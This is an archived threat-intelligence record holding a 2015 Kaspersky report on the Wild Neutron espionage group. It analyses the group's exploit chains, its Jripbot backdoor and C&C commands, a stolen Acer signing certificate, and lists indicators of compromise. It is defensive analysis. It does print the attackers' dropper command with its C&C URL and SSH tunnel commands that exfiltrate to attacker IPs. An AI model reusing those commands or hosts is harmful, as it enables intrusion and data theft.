{
    "id": "6f094481-f5b8-4b91-9f58-9a93f5d51241",
    "created_at": "2023-01-12T15:02:05.573981Z",
    "updated_at": "2025-03-27T02:11:15.761753Z",
    "deleted_at": null,
    "sha1_hash": "60e41fd9aeb90d4903b439ac7ee351f5428b264f",
    "title": "2015-07-08 - Wild Neutron – Economic espionage threat actor returns with new tricks",
    "authors": "",
    "file_creation_date": "2022-05-28T02:01:15Z",
    "file_modification_date": "2022-05-28T02:01:15Z",
    "file_size": 839712,
    "plain_text": "# Wild Neutron – Economic espionage threat actor returns with new tricks\n\n**[securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/](https://securelist.com/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/71275/)**\n\nAuthors\n\nGReAT\n\n## Stolen Acer code signing certificate and unknown Flash Player exploit used in attacks\n\n**[Indicators of Compromise (IOC)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07204443/5548c296-9f00-4c13-bace-71015d68f28d.ioc)**\n\n[A powerful threat actor known as “Wild Neutron” (also known as “Jripbot” and “Morpho“) has](http://www.symantec.com/connect/blogs/morpho-profiting-high-level-corporate-attacks)\nbeen active since at least 2011, infecting high profile companies for several years by using a\ncombination of exploits, watering holes and multi-platform malware.\n\nThe latest round of attacks in 2015 uses a stolen code signing certificate belonging to\nTaiwanese electronics maker Acer and an unknown Flash Player exploit.\n\nWild Neutron hit the spotlight in 2013, when it successfully infected companies such as\nApple, Facebook, Twitter and Microsoft. This attack took advantage of a Java zero-day\nexploit and used hacked forums as watering holes The 2013 incident was highly publicized\n\n\n-----\n\nand, in the aftermath, the threat actor went dark for almost one year.\n\n#WildNeutron is a powerful entity engaged in espionage, possibly for economic\nreasons\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=%23WildNeutron+is+a+powerful+entity+engaged+in+espionage%2C+possibly+for+economic+reasons)\n\nIn late 2013 and early 2014 the attacks resumed and continued throughout 2015. Targets of\nthe new attacks include:\n\nLaw firms\nBitcoin-related companies\nInvestment companies\nLarge company groups often involved in M&A deals\nIT companies\nHealthcare companies\nReal estate companies\nIndividual users\n\nThe focus of these attacks suggests this is not a nation-state sponsored actor. However, the\nuse of zero-days, multi-platform malware as well as other techniques makes us believe it’s a\npowerful entity engaged in espionage, possibly for economic reasons.\n\n## Older (2013) campaigns\n\nDuring the 2013 attacks, the Wild Neutron actor successfully compromised and leveraged\nthe website www.iphonedevsdk[.]com, which is an iPhone developers forum.\n\nThe attackers injected a script into the forum that redirected visitors to another website\n(min.liveanalytics[.]org – currently SINKHOLED by Kaspersky Lab) that hosted a Java\nzero-day exploit. A similar attack was also found in another forum dedicated to Linux\ndevelopers: fedoraforum[.]org. For a more detailed analysis of these 2013 attacks, see Eric\nRomang’s blog: http://eromang.zataz.com/2013/02/20/facebook-apple-twitter-watering-holeattack-additional-informations/.\n\nOther forums compromised by the Wild Neutron group and identified by reports from the\nKaspersky Security Network include:\n\nexpatforum.com\nmygsmindia.com\nforum.samdroid.net\nemiratesmac.com\nforums.kyngdvb.com\ncommunity.flexispy.com\nansar1.info\n\n\n-----\n\nIn particular, two of these stand out: **community.flexispy[.]com and** **ansar1[.]info . The**\nfirst one is a community ran by Flexispy, a company that sells spyware for mobile devices.\nThe second one is a Jihadist forum that is currently closed.\n\n_ansar1[.]info was injected by Wild Neutron in 2013_\n\nBack in 2013, the attackers also leveraged a Mac OS X backdoor, known as OSX/Pintsized.\nThis is also described in more detail in Eric Romang’s excellent blog:\nhttp://eromang.zataz.com/2013/03/24/osx-pintsized-backdoor-additional-details/. The same\nbackdoor, compiled for Win32, is still being used in the 2015 attacks.\n\n#WildNeutron is one of the most unusual APT group we’ve analysed and tracked\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=%23WildNeutron+is+one+of+the+most+unusual+APT+group+we%26%238217%3Bve+analysed+and+tracked)\n\nSome of the more prominent victims of the 2013 attack include Twitter, Facebook, Apple and\n[Microsoft. These breaches were covered widely by the press and some affect companies,](https://www.reuters.com/article/us-apple-hackers-idUSBRE91I10920130219)\n[issued statements on the incident (see Facebook’s statement).](https://www.facebook.com/notes/facebook-security/protecting-people-on-facebook/10151249208250766)\n\nThe targeting of major IT companies like Facebook, Twitter, Apple and Microsoft is unusual,\nhowever, it’s not entirely unique. The lack of victims in other sectors, such as diplomatic or\ngovernment institutions, is however quite unusual. This makes us believe this is not a nationstate sponsored attack\n\n\n-----\n\n## Technical analysis\n\nThe malware set used by the Wild Neutron threat actor has several component groups,\nincluding:\n\nA main backdoor module that initiates the first communication with C&C server\nSeveral information gathering modules\nExploitation tools\nSSH-based exfiltration tools\nIntermediate loaders and droppers that decrypt and run the payloads\n\nAlthough customized, some of the modules seem to be heavily based on open source tools\n(e.g. the password dumper resembles the code of Mimikatz and Pass-The-Hash Toolkit) and\ncommercial malware (HTTPS proxy module is practically identical to the one that is used by\nHesperbot).\n\nAlthough customized, some of the modules seem to be heavily based on open source\ntools #WildNeutron\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=Although+customized%2C+some+of+the+modules+seem+to+be+heavily+based+on+open+source+tools+%23WildNeutron)\n\nAll C&C communication is encrypted with a custom protocol. Dropped executables, as well\nas some of the hardcoded strings are usually obfuscated with XOR (depends on bot\nversion). The main backdoor module contains a number of evasion techniques, designed to\ndetect or time out sandboxes and emulation engines.\n\n### Exploitation – 2015\n\nThe initial infection vector from the 2014-2015 attacks is still unknown, although there are\nclear indications that the victims are exploited by a kit that leverages an unknown Flash\nPlayer exploit.\n\nThe following exploitation chain was observed in one of the attacks:\n\n**Site** hxxp://cryptomag.mediasource.ch/\n\n**Paths** /favicon.ico\n\n/msie9html5.jpg\n\n/loader-large.gif\n\n/bootstrap.min.css\n\n/stats.js?d=1434374526478\n\n/autoload.js?styleid=20&langid=5&sid=883f2efa&d=1434374526\n\n/banner.html?styleid=19&langid=23&sid=883f2efa&d=1434374526\n\n/883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa&d=1434374533\n\n/883f2efa/pzixfgne?styleid=5&langid=25&sid=883f2efa&d=1434374533\n\n/883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa&d=1434374533/\n\n/background.jpg\n\n\n-----\n\nThe subdomain cryptomag.mediasource[.]ch appears to have been created for this attack;\nit pointed to an IP address associated with other Wild Neutron C&Cs, highlighted in red\nbelow:\n\n_Hosts resolving to 66.55.133[.]89_\n\nWhile app.cloudprotect[.]eu and ssl.cloudprotect[.]eu are two known Wild Neutron C&Cs,\ncryptomag.mediasource[.]ch appears to have been pointed to this IP for the purpose of\nexploitation. Another suspicious domain can be observed above, secure.pdf-info[.]com. We\nhaven’t seen any attacks connected with his hostname yet, however, the name scheme\nindicates this is also malicious.\n\nIn another attack, we observed a similar exploitation chain, however hosted on a different\nwebsite, hxxp://find.a-job.today/.\n\nIn both cases, the visitors browsed the website, or arrived via what appears to have been an\nonline advertisement. From there, “autoload.js” appears in both cases, which redirects to\nanother randomly named HTML file, which eventually loads a randomly named SWF file.\n\nWhile the group used watering hole attacks in 2013, it’s still unclear how victims get\nredirected to the exploitation kits in the new 2014-2015 attacks. Instead of Flash exploits,\nolder Wild Neutron exploitation and watering holes used what was a Java zero-day at the\nend of 2012 and the beginning of 2013, detected by Kaspersky Lab products as\n_Exploit.Java.CVE-2012-3213.b._\n\n### The main malware dropper\n\nThe functionality of the main dropper is relatively simple: it decrypts the backdoor executable\n(stored as a resource and encrypted with a simple XOR 0x66), writes it to a specified path\nand then executes it with parameters that are hardcoded in the dropper body. One of the\nparameters is the URL address of the C&C server, while others contain various bot\nconfiguration options.\n\n\n-----\n\nExample parameters used by the dropper:\n\nigfxupt.exe https://app.cloudprotect[.]eu:443 /opts resolv=logs.cloudprotect[.]eu\n\nAfter executing the main backdoor, the dropper is securely deleted by overwriting its content\nwith random numbers several times before renaming and removing the file.\n\n### The main backdoor (aka “Jripbot”)\n\nThis binary is executed with the URL address of the C&C server as a parameter; it can also\nreceive an optional bot configuration. This information is then double-encrypted – first with\nRC4 and then with Windows CryptProtectData function – and saved to the registry.\n\nBefore performing any other activity, the malware first runs its stalling code (designed to\noutrun the emulators), then performs several anti-sandboxing checks and enters an infinite\nloop if any unwanted software running in the system is detected.\n\nOtherwise, it gathers some basic system information:\n\nVersion of the operating system\nIf program is running under WOW64\nIf current user has administrator privileges\nWhich security features of Windows are enabled\nUsername and computer name\nServer name and LAN group\nInformation about logical drives\nSystem uptime and idle time\nDefault web browser\nProxy settings\n\nBased on some of this information, malware generates a unique ID for the victim and starts\nthe C&C communication by sending the ID value and awaiting commands.\n\nBackdoor configuration options may include proxy server address and credentials,\nsleeptime/delay values and connection type, but the most interesting option is the resolv=[url]\noption. If this option is set, the malware generates a domain name consisting of computer\nname, unique ID and and the URL passed with this option; then it tries to resolve the IP\naddress of this domain. We suspect this is the method the attackers use to send the\ngenerated UID to the C&C.\n\nCommands from the C&C may instruct the bot to perform following actions:\n\nChange the current directory to the requested one\nExecute an arbitrary command in the command line\nSet the autorun value for itself in the registry\n\n\n-----\n\nDelete the autorun value for itself in the registry\nShred requested file (overwrite the file content with random numbers, overwrite the file\nname with zeroes and then delete it)\nDownload file from the Internet and save it (optionally encrypted) to the disk\nInstall or uninstall additional malware plugins\nCollect and send system information\nEnumerate drives\nSet sleeptime value\nUpdate the configuration\nUpdate itself\nQuit\n\nOlder versions of this backdoor, used in the 2013 attacks, had a bit more functionality:\n\nPassword harvesting\nPort scanning\nCollecting screenshots\nPushing files to C&C\nReverse shell\n\nThese features were removed from the newer backdoor versions that are used in recent\nattacks. Instead, malware developers decided to implement a plugin mechanism and run\ndifferent tools for different tasks. This suggests a clear shift towards more flexible modular\narchitecture.\n\n#WildNeutron hide the C&C address by encrypting it in the registry with machinedependent information\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=%23WildNeutron+hide+the+C%26amp%3BC+address+by+encrypting+it+in+the+registry+with+machine-dependent+information+)\n\nIn terms of functionality, the main backdoor is no different from many other Remote Access\nTools (RATs). What really stands out is the attacker’s carefulness to hide the C&C address,\nby encrypting it in the registry with machine-dependent information. Also notable is the ability\nto recover from a C&C shutdown by contacting a dynamically generated domain name,\nwhich only the attackers know in advance, as it is directly tied to each unique victim.\n\nAccording to the timestamp of the samples the distribution is as follows:\n\n\n-----\n\nEach backdoor appears to contain an internal version number, which ranges from 11000 to\n16000 in the latest samples. This allows us to trace the following evolutionary map:\n\nBackdoors used in the 2013 attacks:\n\n**MD5** **Timestamp** **Version** **Filename** **Size**\n\n1582d68144de2808b518934f0a02bfd6 29 Nov 2012 **11000** javacpl.exe 327168\n\n14ba21a3a0081ef60e676fd4945a8bdc 30 Nov 2012 **12000** javacpl.exe 329728\n\n0fa3657af06a8cc8ef14c445acd92c0f 09 Jan 2013 **13000** javacpl.exe 343552\n\nBackdoors used in 2014 and 2015 attacks:\n\n**MD5** **Timestamp** **Version** **Filename** **Size**\n\n\n95ffe4ab4b158602917dd2a999a8caf8 13 Dec\n2013\n\n342887a7ec6b9f709adcb81fef0d30a3 20 Jun\n2014\n\ndee8297785b70f490cc00c0763e31b69 02 Aug\n2013\n\n(possibly\nfake)\n\n\n**14014** LiveUpdater.exe 302592\n\n**15013** FlashUtil.exe 302592\n\n**16010** IgfxUpt.exe 291328\n\n\n-----\n\nf0fff29391e7c2e7b13eb4a806276a84 27 Oct\n2014\n\n\n**16017** RtlUpd.exe 253952\n\n\nThe installers also have a version number, which indicates the following evolution:\n\n**MD5** **Timestamp** **Version**\n\n1f5f5db7b15fe672e8db091d9a291df0 16 Dec 2011 1.4.1\n\n48319e9166cda8f605f9dce36f115bc8 28 Sep 2012 1.5.0\n\n088472f712d1491783bbad87bcc17c48 12 Apr 2013 1.6.3\n\nee24a7ad8d137e54b854095188de0bbf 07 Jan 2014 1.6.4\n\n### Lateral movement\n\nAfter installing the main backdoor and establishing initial C2 communication, the attackers\nuse a range of different tools to extract sensitive data and control the victim’s machine.\nThese tools include a password harvesting trojan, a reverse-shell backdoor and customized\nimplementations of OpenSSH, WMIC and SMB. Sometimes, they only drop a simple perl\nreverse shell and use various collection methods to retrieve credentials from a set of\nmachines, escalate privileges, and fan out across a network from there. Besides these tools,\nthere is also a number of small utility modules of different functionalities, from loaders and\nconfiguration tools, to file shredders and network proxies.\n\nIt’s also worth noting that this threat actor heavily relies on already existing code, using\npublicly available open source applications, as well as Metasploit tools and leaked malware\nsources, to build its own toolset. Some of these tools are designed to work under Cygwin\nand come together with the Cygwin API DLL, which may suggest that the attackers feel more\ncomfortable when working in a Linux-like environment.\n\n### SSH tunnel backdoor\n\nDuring the 2014/2015 attacks, we observed the attackers deploying custom, OpenSSHbased Win32 tunnel backdoors that are used to exfiltrate large amounts of data in a reliable\nmanner. These tunnel backdoors are written as “updt.dat” and executed with two\nparameters, -z and -p. These specify the IP to connect to and the port. Despite the port\nnumber 443, the connection is SSH:\n\n/d /u /c updt.dat -z 185.10.58.181 -p 443\n/d /u /c updt.dat -z 46.183.217.132 -p 443\n/d /u /c updt.dat -z 217.23.6.13 -p 443\n\nFor authentication, the SSH tunnel backdoor contains a hardcoded RSA private key.\n\n\n-----\n\n### Stolen certificate\n\nDuring the 2015 attacks, Wild Neutron used a dropper signed with a stolen, yet valid Acer\nIncorporated certificate.\n\n_Acer signature on Wild Neutron dropper_\n\nThe abused certificate has the following properties:\n\n**Serial: 5c c5 3b a3 e8 31 a7 df dc 7c 28 d5 15 8f c3 80**\n\n**Thumbprint: 0d 85 91 41 ee 9a 0c 6e 72 5f fe 6b cf c9 9f 3e fc c3 fc 07**\n\nThe dropper (dbb0ea0436f70f2a178a60c4d8b791b3) appears to have been signed on June\n15, 2015. It drops a Jripbot backdoor as “IgfxUpt.exe” and configures it to use the C&C\n“app.cloudprotect[.]eu”.\n\n#WildNeutron used a dropper signed with a stolen, yet valid Acer Incorporated\ncertificate\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=%23WildNeutron+used+a+dropper+signed+with+a+stolen%2C+yet+valid+Acer+Incorporated+certificate)\n\nWe have worked with Symantec, Verisign and Acer to revoke the compromised certificate.\n\n## Victims and statistics\n\n\n-----\n\nThe Wild Neutron attacks appear to have a highly targeted nature. During our investigation,\nwe have been able to identify several victims across 11 countries and territories:\n\nFrance\nRussia\nSwitzerland\nGermany\nAustria\nPalestine\nSlovenia\nKazakhstan\nUAE\nAlgeria\nUnited States\n\n\n-----\n\nThe victims for the 2014-2015 versions are generally IT and real estate/investment\ncompanies and in both cases, a small number of computers have been infected throughout\nthe organizations. The attackers appear to have updated the malware implant and deployed\nsome additional tools, however, we haven’t observed serious lateral movement in these\ncases.\n\n## Attribution\n\nThe targeting of various companies, without a government focus, makes us believe this is\nnot a nation state sponsored APT. The attackers have also shown an interest in investment\nrelated targets, which indicate knowledge and skills to exploit such information on the market\nto turn it into financial advantages.\n\nIn some of the samples, the encrypted configuration includes a Romanian language\nstring #WildNeutron\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=In+some+of+the+samples%2C+the+encrypted+configuration+includes+a+Romanian+language+string+%23WildNeutron)\n\nIn some of the samples, the encrypted configuration includes a Romanian language string,\nwhich is used to mark the end of the C&C communication:\n\nInterestingly, “La revedere” means “goodbye” in Romanian. In addition to that, we found\nanother non-English string which is the latin transcription of the russian word Успешно\n(“uspeshno” -> “successfully”); this string is written to a pipe after executing a C2 command.\n\nWe found another non-English string which is the latin transcription of the russian word\n#WildNeutron\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F71275%2F&text=We+found+another+non-English+string+which+is+the+latin+transcription+of+the+russian+word+%23WildNeutron)\n\nOne of the samples has an internal name of “WinRAT-Win32-Release.exe”. This seems to\nindicate the authors are calling the malware “WinRAT”.\n\n\n-----\n\n**More information about the Wild Neutron attribution is available to Kaspersky**\n**Intelligence Services customers. Contact: intelreports@kaspersky.com**\n\n## Conclusions\n\nCompared to other APT groups, Wild Neutron is one of the most unusual ones we’ve\nanalysed and tracked. Active since 2011, the group has been using at least one zero-day\nexploit, custom malware and tools and managed to keep a relatively solid opsec which so far\neluded most attribution efforts. Their targeting of major IT companies, spyware developers\n(FlexiSPY), jihadist forums (the “Ansar Al-Mujahideen English Forum”) and Bitcoin\ncompanies indicate a flexible yet unusual mindset and interests.\n\nSome of group’s distinctive features include:\n\nUse of open source tools and leaked sources of other malware\nUse of stolen certificate from Acer Incorporated to sign malware\nUse of cross platform zero-day exploit (Java and Flash) followed by cross platform\npayload reverse shell (Perl) for initial penetration\nUse of *NIX code ported to Windows through Cygwin\nHeavy use of SSH for exfiltration, a commonly used *NIX administration tool\nUse of CryptProtectData API to keep C&C URLs secret\nSimple command line interface, built around all malware components, utilizing named\npipes for communication between modules;\nAuxiliary tools are written in C and most of them contain a built-in help, which may be\nprinted by executing the binary with a “–pleh” parameter\n\nWe continue to track the Wild Neutron group, which is still active as of June 2015.\n\nKaspersky products detect the malware used in the attacks as:\n\nHEUR:Trojan.Win32.WildNeutron.gen, Trojan.Win32.WildNeutron.*, Trojan.Win32.JripBot.*,\nHEUR:Trojan.Win32.Generic\n\nRead more about how Kaspersky Lab products can help to protect you from Wild Neutron\nthreat actor here:\n\n[Wild Neutron in the wild: perhaps you’re his next prey](https://business.kaspersky.com/wildneutron-in-the-wild-perhaps-youre-his-next-prey/4169)\n\n## Indicators of Compromise (IOCs)\n\n### Known malicious hostnames and domains:\n\nddosprotected.eu\n\nupdatesoft.eu\n\napp.cloudprotect.eu\n\nfw.ddosprotected.eu\n\n\n-----\n\nlogs.cloudprotect.eu\nssl.cloudprotect.eu\nssl.updatesoft.eu\nadb.strangled.net\ndigitalinsight-ltd.com\nads.digitalinsight-ltd.com\ncache.cloudbox-storage.com\ncloudbox-storage.com\nclust12-akmai.net\ncorp-aapl.com\nfb.clust12-akmai.net\nfbcbn.net\nimg.digitalinsight-ltd.com\njdk-update.com\nliveanalytics.org\nmin.liveanalytics.org\npop.digitalinsight-ltd.com\nww1.jdk-update.com\nfind.a-job.today\ncryptomag.mediasource.ch\n\n### Known malicious IPs:\n\n185.10.58.181\n\n46.183.217.132\n\n64.187.225.231\n\n62.113.238.104\n\n66.55.133.89\n\n217.23.6.13\n\n### Known file names:\n\n%APPDATA%\\Roaming\\FlashUtil.exe\n\n%APPDATA%\\Roaming\\Acer\\LiveUpdater.exe\n\n%APPDATA%\\Roaming\\Realtek\\RtlUpd.exe\n\n%ProgramData%\\Realtek\\RtlUpd.exe\n\n%APPDATA%\\Roaming\\sqlite3.dll (UPX packed)\n\n%WINDIR%\\winsession.dll\n\n%APPDATA%\\appdata\\local\\temp\\teamviewer\\version9\\update.exe\n\n%SYSTEMROOT%\\temp\\_dbg.tmp\n\n%SYSTEMROOT%\\temp\\ok.tmp\n\nC:\\windows\\temp\\debug.txt\n\nC:\\windows\\syswow64\\mshtaex.exe\n\n\n-----\n\n%SYSROOT%\\System32\\mshtaex.exe\n%SYSROOT%\\System32\\wdigestEx.dll\n%SYSROOT%\\System32\\dpcore16t.dll\n%SYSROOT%\\System32\\iastor32.exe\n%SYSROOT%\\System32\\mspool.dll\n%SYSROOT%\\System32\\msvcse.exe\n%SYSROOT%\\System32\\mspool.exe\nC:\\Program Files (x86)\\LNVSuite\\LnrAuth.dll\nC:\\Program Files (x86)\\LNVSuite\\LnrAuthSvc.dll\nC:\\Program Files (x86)\\LNVSuite\\LnrUpdt.exe\nC:\\Program Files (x86)\\LNVSuite\\LnrUpdtP.exe\nDF39527~.tmp\n\n### Named pipes:\n\n\\\\.\\pipe\\winsession\n\n\\\\.\\pipe\\lsassw\n\n### Events & mutexes:\n\nGlobal\\LnrRTPDispatchEvents\n\n_Winlogon_TCP_Service\n\n[APT](https://securelist.com/tag/apt/)\n[Cyber espionage](https://securelist.com/tag/cyber-espionage/)\n[Digital Certificates](https://securelist.com/tag/digital-certificates/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n\nAuthors\n\nGReAT\n\nWild Neutron – Economic espionage threat actor returns with new tricks\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-07-08 - Wild Neutron – Economic espionage threat actor returns with new tricks.pdf"
    ],
    "report_names": [
        "2015-07-08 - Wild Neutron – Economic espionage threat actor returns with new tricks.pdf"
    ],
    "threat_actors": [
        {
            "id": "a653b7ac-97b5-465b-98cd-8713223b06a7",
            "created_at": "2023-01-06T13:46:38.592385Z",
            "updated_at": "2025-03-27T02:00:02.868419Z",
            "deleted_at": null,
            "main_name": "WildNeutron",
            "aliases": [
                "Morpho",
                "Sphinx Moth"
            ],
            "source_name": "MISPGALAXY:WildNeutron",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "92c0dae2-e255-4b90-8d8f-be88e393ab8d",
            "created_at": "2022-10-25T16:07:24.402328Z",
            "updated_at": "2025-03-27T02:02:10.209983Z",
            "deleted_at": null,
            "main_name": "Wild Neutron",
            "aliases": [
                "Butterfly",
                "Morpho",
                "Sphinx Moth",
                "The Postal Group",
                "Wild Neutron"
            ],
            "source_name": "ETDA:Wild Neutron",
            "tools": [
                "HesperBot",
                "Jiripbot",
                "JripBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535725,
    "ts_updated_at": 1743041475,
    "ts_creation_date": 1653703275,
    "ts_modification_date": 1653703275,
    "files": {
        "pdf": "https://archive.orkl.eu/60e41fd9aeb90d4903b439ac7ee351f5428b264f.pdf",
        "text": "https://archive.orkl.eu/60e41fd9aeb90d4903b439ac7ee351f5428b264f.txt",
        "img": "https://archive.orkl.eu/60e41fd9aeb90d4903b439ac7ee351f5428b264f.jpg"
    }
}